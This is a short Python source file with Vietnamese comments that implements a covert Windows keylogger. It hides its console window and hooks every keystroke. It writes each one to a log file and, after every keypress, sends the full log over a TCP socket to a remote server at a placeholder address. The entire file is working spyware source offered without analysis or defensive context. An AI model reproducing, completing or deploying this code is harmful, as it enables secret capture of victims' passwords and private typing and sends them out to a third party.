import socket
import win32api
import win32console
import win32gui
import pythoncom
import pyHook
import os

# Ẩn cửa sổ console
win = win32console.GetConsoleWindow()
win32gui.ShowWindow(win, 0)

log_file = 'C:\\path_to_log\\log.txt'
server_ip = '192.168.x.x'  # IP của server
server_port = 65432

def OnKeyboardEvent(event):
    with open(log_file, 'a') as f:
        f.write(chr(event.Ascii))
    send_log_file(log_file)
    return True

def send_log_file(file_path):
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((server_ip, server_port))

    with open(file_path, 'rb') as file:
        while chunk := file.read(1024):
            client_socket.send(chunk)

    client_socket.close()

# Đăng ký hàm xử lý với HookManager
hm = pyHook.HookManager()
hm.KeyDown = OnKeyboardEvent
hm.HookKeyboard()

while True:
    pythoncom.PumpWaitingMessages()
